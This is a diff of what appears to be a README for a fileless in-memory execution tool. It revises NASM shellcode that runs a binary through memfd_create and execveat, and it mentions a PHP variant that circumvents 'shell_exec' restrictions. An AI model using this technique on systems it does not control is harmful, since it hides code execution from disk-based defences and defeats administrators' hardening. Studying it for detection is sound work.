@@ -43,8 +43,8 @@ The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberci
 
 For the addicts, here is the nasm of the shellcode (memfd_create, copy loop & execveat):
 ```nasm
-; nasm -felf64 open.nasm && ld open.o &&  ./a.out
-; 
+; nasm -felf64 memexec.nasm && ld memexec.o &&  ./a.out
+
 global _start
 section .text
 
@@ -82,15 +82,15 @@ done:
 
     mov     rax, 322    ; arg 0: execveat_NR
     mov     rdi, r8     ; arg 1: memfd
-    push    0x00
+    push    0x00        ; an empty string
     mov     rsi, rsp    ; arg 2: path (empty string)
-    xor     rdx, rdx    ; arg 3: ARGV [NULL]
-    xor     rcx, rcx    ; arg 4: ENV ?
-    xor     r9, r9      ; arg 4: ENV ?
-    xor     r10, r10    ; arg 4: ENV
+    mov     rdx, rsp    ; arg 3: ARGV points to empty string
+    xor     rcx, rcx    ; arg 4: ENV
     mov     r8, 0x1000  ; arg 5: AT_EMPTY_PATH
+    xor     r9, r9      ; arg 6: must be clean
+    xor     r10, r10    ; arg 7: must be clean
     syscall
-    
+
     mov     rax, 60
     xor     rdi, rdi
     syscall
